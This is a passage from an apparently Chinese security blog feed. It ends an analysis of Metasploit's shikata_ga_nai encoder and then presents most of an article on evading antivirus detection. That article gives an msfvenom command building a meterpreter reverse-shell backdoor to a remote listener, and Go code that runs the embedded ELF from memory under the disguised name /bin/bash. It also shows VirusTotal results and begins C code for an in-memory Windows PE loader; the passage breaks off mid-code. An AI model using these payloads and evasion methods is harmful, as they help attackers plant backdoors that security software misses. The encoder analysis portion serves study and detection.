<code>XORK</code> 就是最后的解密密钥，这个值是动态变化的，保证每次都不相同。</p><p>但是这样的一个解密的头部，其实还是存在一个很固定的形式的，来看 <code>generate_shikata_block</code> 的代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">count_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'count'</span>, <span class="string">'ecx'</span>)</span><br><span class="line">addr_reg  = Rex::Poly::LogicalRegister::X86.new(<span class="string">'addr'</span>)</span><br><span class="line">key_reg = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> state.context_encoding</span><br><span class="line">  key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'key'</span>, <span class="string">'eax'</span>)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  key_reg = Rex::Poly::LogicalRegister::X86.new(<span class="string">'key'</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare individual blocks</span></span><br><span class="line">endb = Rex::Poly::SymbolicBlock::End.new</span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear the counter register</span></span><br><span class="line">clear_register = Rex::Poly::LogicalBlock.new(<span class="string">'clear_register'</span>,</span><br><span class="line">  <span class="string">"\x31\xc9"</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">"\x29\xc9"</span>,  <span class="comment"># sub ecx,ecx</span></span><br><span class="line">  <span class="string">"\x33\xc9"</span>,  <span class="comment"># xor ecx,ecx</span></span><br><span class="line">  <span class="string">"\x2b\xc9"</span>)  <span class="comment"># sub ecx,ecx</span></span><br></pre></td></tr></table></figure><p><code>ecx</code> 中存储是接下来要进行解密的长度，所以需要先清空 <code>ecx</code>,清空的指令是从这几条指令中任选一条。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (length &lt;= <span class="number">255</span>)</span><br><span class="line">  init_counter.add_perm(<span class="string">"\xb1"</span> + [ length ].pack(<span class="string">'C'</span>))</span><br><span class="line"><span class="keyword">elsif</span> (length &lt;= <span class="number">65536</span>)</span><br><span class="line">  init_counter.add_perm(<span class="string">"\x66\xb9"</span> + [ length ].pack(<span class="string">'v'</span>))</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  init_counter.add_perm(<span class="string">"\xb9"</span> + [ length ].pack(<span class="string">'V'</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Key initialization block</span></span><br><span class="line">init_key = <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If using context encoding, we use a mov reg, [addr]</span></span><br><span class="line"><span class="keyword">if</span> state.context_encoding</span><br><span class="line">  init_key = Rex::Poly::LogicalBlock.new(<span class="string">'init_key'</span>,</span><br><span class="line">    Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xa1</span> + b.regnum_of(key_reg)).chr + <span class="string">'XORK'</span>&#125;)</span><br><span class="line"><span class="comment"># Otherwise, we do a direct mov reg, val</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  init_key = Rex::Poly::LogicalBlock.new(<span class="string">'init_key'</span>,</span><br><span class="line">    Proc.new &#123; <span class="params">|b|</span> (<span class="number">0xb8</span> + b.regnum_of(key_reg)).chr + <span class="string">'XORK'</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">xor  = Proc.new &#123; <span class="params">|b|</span> <span class="string">"\x31"</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line">add  = Proc.new &#123; <span class="params">|b|</span> <span class="string">"\x03"</span> + (<span class="number">0x40</span> + b.regnum_of(addr_reg) + (<span class="number">8</span> * b.regnum_of(key_reg))).chr &#125;</span><br><span class="line"></span><br><span class="line">sub4 = Proc.new &#123; <span class="params">|b|</span> sub_immediate(b.regnum_of(addr_reg), -<span class="number">4</span>) &#125;</span><br><span class="line">add4 = Proc.new &#123; <span class="params">|b|</span> add_immediate(b.regnum_of(addr_reg), <span class="number">4</span>) &#125;</span><br></pre></td></tr></table></figure><p>计算偏移，生成如下四条指令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048062 B1 1F                                   mov     cl, 1Fh</span><br><span class="line">LOAD:08048064 31 7D 1A                                xor     [ebp+1Ah], edi</span><br><span class="line">LOAD:08048067 83 ED FC                                sub     ebp, 0FFFFFFFCh</span><br><span class="line">LOAD:0804806A 03 7D 16                                add     edi, [ebp+16h]</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fpu = Rex::Poly::LogicalBlock.new(<span class="string">'fpu'</span>,</span><br><span class="line">*fpu_instructions)</span><br><span class="line"></span><br><span class="line">fnstenv = Rex::Poly::LogicalBlock.new(<span class="string">'fnstenv'</span>,</span><br><span class="line"><span class="string">"\xd9\x74\x24\xf4"</span>)</span><br><span class="line">fnstenv.depends_on(fpu)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get EIP off the stack</span></span><br><span class="line">getpc = Rex::Poly::LogicalBlock.new(<span class="string">'getpc'</span>,</span><br><span class="line">Proc.new &#123; <span class="params">|b|</span> (<span class="number">0x58</span> + b.regnum_of(addr_reg)).chr &#125;)</span><br><span class="line">getpc.depends_on(fnstenv)</span><br></pre></td></tr></table></figure><p>生成 <code>fpu</code> 操作指令和 <code>fnstenv</code> 指令，来getpc。</p><p>可以看到 <code>\xd9\x74\x24\xf4</code> 是一个硬编码，这就是一个特征。同时<code>fpu</code> 指令也是有限的：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fpu_instructions</span></span></span><br><span class="line">  puts <span class="string">"-----sub_immediate : fpu_instructions----------------"</span></span><br><span class="line">  fpus = []</span><br><span class="line"></span><br><span class="line">  <span class="number">0xe8</span>.upto(<span class="number">0xee</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xd9"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xcf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xd9"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xdf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xda"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xdf</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xdb"</span> + x.chr &#125;</span><br><span class="line">  <span class="number">0xc0</span>.upto(<span class="number">0xc7</span>) &#123; <span class="params">|x|</span> fpus &lt;&lt; <span class="string">"\xdd"</span> + x.chr &#125;</span><br><span class="line"></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xd0"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xe1"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xf6"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xf7"</span></span><br><span class="line">  fpus &lt;&lt; <span class="string">"\xd9\xe5"</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># This FPU instruction seems to fail consistently on Linux</span></span><br><span class="line">  <span class="comment">#fpus &lt;&lt; "\xdb\xe1"</span></span><br><span class="line"></span><br><span class="line">  fpus</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>所有可能的指令选择都在 <code>fpus</code> 这个数组中了。剩下的部分就不再说了。</p><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>经过上述的分析，可以发现 <code>x86/shikata_ga_nai</code> 编码器的特征也是比较固定的，所以针对这个特征写出专有的静态查杀规则也是比较简单的。本文就不再写了，有兴趣的自己写一个把。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/242550&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/242550&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本文主要是通过编写一些自动化的工具来分析metepreter生成的linux平台的shellcode loader，以及解释一些常用的编码器的工作过程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;本文使用的工具是 unicorn，官方版本没有执行SMC代码的能力(已经在修了)，推荐暂时使用个人patch版本&lt;a href=&quot;https://github.com/wonderkun/unicorn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/wonderkun/unicorn&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="杀软的无奈" scheme="http://blog.wonderkun.cc/tags/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88/"/>
    
  </entry>
  
  <entry>
    <title>杀软的无奈-最简单的免杀(二)</title>
    <link href="http://blog.wonderkun.cc/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/"/>
    <id>http://blog.wonderkun.cc/2021/03/24/杀软的无奈-最简单的免杀(二)/</id>
    <published>2021-03-24T11:57:14.000Z</published>
    <updated>2024-11-18T11:46:14.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242549" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242549</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。<br><strong>本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别</strong></p><a id="more"></a><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>今天要讲的主角其实是go语言。go语言是2009年google发布的语言，由于其有类似于c和c++一样的性能，同时还具备类似于解释性语言的垃圾回收机制，并且不像java一样依赖虚拟机，优秀的跨平台优势和1.4版本之后go语言实现的支持交叉编译的编译器，让它迅速火了起来。</p><p>但是优秀的同时，它以牺牲自己二进制的体积为代价，每个go二进制都静态链接了一个runtime库，此库实现了垃圾回收、线程调度、go语言特有的关键特性等任务。此库的功能非常强大，因为导致一个简单的”hello world”就有1700多个函数。<br>有如此多的函数，那从这一堆函数中找出具有恶意功能的函数简直像大海捞针一样困难，这是市面上的大部分杀毒引擎对go二进制的检测能力比较薄弱的一个原因。</p><p>本文主要是用go语言的相关工具，来彻底免杀之前会被查杀的elf恶意代码。(windows平台类似的方法，但是我并没有测试免杀效果。)</p><h2 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h2><p><strong>基本思想就是把一个不免杀的ELF文件作为字节数据存储在go编写的二进制中，然后go二进制执行的时候从自身读出恶意代码然后直接加载到内存中执行，保证恶意代码不落盘</strong></p><p>这个方法非常简单，不需要分析什么shellcode特征，甚至不需要写什么代码，就能实现效果不错的免杀，而且检测比较困难。</p><p>可选的工具有很多:</p><ul><li><a href="https://github.com/gobuffalo/packr" target="_blank" rel="noopener">https://github.com/gobuffalo/packr</a></li><li><a href="https://github.com/rakyll/statik" target="_blank" rel="noopener">https://github.com/rakyll/statik</a></li><li><a href="https://github.com/GeertJohan/go.rice" target="_blank" rel="noopener">https://github.com/GeertJohan/go.rice</a></li><li><a href="https://github.com/UnnoTed/fileb0x" target="_blank" rel="noopener">https://github.com/UnnoTed/fileb0x</a></li><li><a href="https://github.com/mjibson/esc" target="_blank" rel="noopener">https://github.com/mjibson/esc</a></li><li><a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a></li><li><a href="https://github.com/lu4p/binclude" target="_blank" rel="noopener">https://github.com/lu4p/binclude</a></li><li><a href="https://github.com/omeid/go-resources" target="_blank" rel="noopener">https://github.com/omeid/go-resources</a></li><li><a href="https://github.com/pyros2097/go-embed" target="_blank" rel="noopener">https://github.com/pyros2097/go-embed</a></li><li><a href="https://github.com/wlbr/mule" target="_blank" rel="noopener">https://github.com/wlbr/mule</a></li><li><a href="https://github.com/miscing/embed" target="_blank" rel="noopener">https://github.com/miscing/embed</a></li><li><a href="https://github.com/kyioptr/gassets" target="_blank" rel="noopener">https://github.com/kyioptr/gassets</a></li></ul><p>甚至 go1.6 就默认支持<a href="https://go.googlesource.com/proposal/+/master/design/draft-embed.md" target="_blank" rel="noopener">https://go.googlesource.com/proposal/+/master/design/draft-embed.md</a> ，你说开心不开心，默认支持的能有啥特征呢？ 哈哈哈哈</p><p>下面就先使用 <a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a> 来测试一下效果。</p><h2 id="linux平台免杀"><a href="#linux平台免杀" class="headerlink" title="linux平台免杀"></a>linux平台免杀</h2><ol><li>用msf生成一个后门</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=192.168.1.1 lport=6666 -f elf &gt; ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>这个样本肯定是不免杀的，上传到virustotal上看一下。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png" alt=""></p><p>竟然才仅有4款杀毒软件报毒，这太出乎意料了，是杀毒软件提不动刀了，还是metasploit的编码器太强了？不过 anyway，我们还是用go去加载这个二进制，看一下效果。</p><ol start="2"><li>使用go-bindata 打包到一个文件中</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/kevinburke/go-bindata</span></span><br><span class="line">./go-bindata ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>这样就会生成一个  <code>bindata.go</code> 的文件，里面以压缩字节的形式存储这 ./test 的数据。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-51-03.png" alt=""></p><p>接下来在 <code>bindata.go</code> 中编写main函数，来让test文件从内存执行:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// 注意这个syscall 只有 3.17 之后的内核才支持,现在大部分的机器都支持了。</span></span><br><span class="line">memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">data, err := Asset(<span class="string">"test"</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Asset was not found.</span></span><br><span class="line">fmt.Println(<span class="string">"read test file content error!"</span>)</span><br><span class="line">&#125;</span><br><span class="line">filename := <span class="string">""</span></span><br><span class="line"></span><br><span class="line">fd, _, _ := syscall.Syscall(memfdCreate, <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;filename)), <span class="keyword">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">_, _ = syscall.Write(<span class="keyword">int</span>(fd), data)</span><br><span class="line">displayName := <span class="string">"/bin/bash"</span></span><br><span class="line"></span><br><span class="line">fdPath := fmt.Sprintf(<span class="string">"/proc/self/fd/%d"</span>, fd)</span><br><span class="line">_ = syscall.Exec(fdPath, []<span class="keyword">string</span>&#123;displayName&#125;, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后，发现这个后门功能正常，上传到 virustotal 再看一下效果。</p><p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-22-10-39.png" alt=""></p><p>效果还算理想。这里可以放任意的会被杀软干掉的二进制，应该免杀效果都是杠杠的。 </p><h2 id="windows平台免杀"><a href="#windows平台免杀" class="headerlink" title="windows平台免杀"></a>windows平台免杀</h2><p>windows平台上也是同样的道理，只是windows没有 <code>memfd_create</code> 这样方便的syscall供我们调用，但是 「exe_run_in_memory」也很容易实现，下面我们尝试简单讲一下过程。<br>「exe_run_in_memory」可以直接用go语言实现，但是需要自己定义很多结构，而且不能像c语言那样便捷的处理PE结构，所以本文为了节省时间，直接复用了之前c语言来实现的加载的代码，然后用cgo进行调用。</p><p>用c语言来实现内存的map：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">mapping</span><span class="params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="comment">// 获取SizeOfHeaders的值: 所有头+节表头的大小</span></span><br><span class="line">DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line"><span class="comment">// 获取节表的数量</span></span><br><span class="line">WORD wNumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="comment">// 获取第一个节表头的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));</span></span><br><span class="line"><span class="comment">这样计算是错误的,因为 64 位程序和 32 位程序 IMAGE_NT_HEADERS 的大小不一样</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">   <span class="comment">// 32 位镜像 </span></span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS32));</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line"></span><br><span class="line">pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS64));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 无法识别的 EXE 镜像 </span></span><br><span class="line">ShowError(<span class="string">"cann't identify file format."</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载 所有头+节表头的大小</span></span><br><span class="line"><span class="built_in">memcpy</span>(lpBaseAddress, lpData, dwSizeOfHeaders);</span><br><span class="line"><span class="comment">// 对齐SectionAlignment循环加载节表</span></span><br><span class="line">WORD i = <span class="number">0</span>;</span><br><span class="line">LPVOID lpSrcMem = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID lpDestMem = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSizeOfRawData = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; wNumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span> == pSectionHeader-&gt;VirtualAddress) ||</span><br><span class="line">(<span class="number">0</span> == pSectionHeader-&gt;SizeOfRawData))</span><br><span class="line">&#123;</span><br><span class="line">pSectionHeader++;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lpSrcMem = (LPVOID)((UNPTR)lpData + pSectionHeader-&gt;PointerToRawData);</span><br><span class="line">lpDestMem = (LPVOID)((UNPTR)lpBaseAddress + pSectionHeader-&gt;VirtualAddress);</span><br><span class="line">dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData;</span><br><span class="line"><span class="built_in">memcpy</span>(lpDestMem, lpSrcMem, dwSizeOfRawData);</span><br><span class="line"></span><br><span class="line">pSectionHeader++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析导入表,并修改IAT地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">doImTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR pImportTable = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line"><span class="comment">// 如果是64位 </span></span><br><span class="line">PIMAGE_NT_HEADERS64 pNtHeaders64 = (PIMAGE_NT_HEADERS64)(pNtHeaders);</span><br><span class="line">pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">pNtHeaders64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line"><span class="comment">// 如果是32位 </span></span><br><span class="line">pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((UNPTR)pDosHeader +</span><br><span class="line">pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环遍历DLL导入表中的DLL及获取导入表中的函数地址</span></span><br><span class="line"><span class="keyword">char</span> *lpDllName = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportNameArray = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME lpImportByName = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_THUNK_DATA lpImportFuncAddrArray = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC lpFuncAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == pImportTable-&gt;OriginalFirstThunk)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 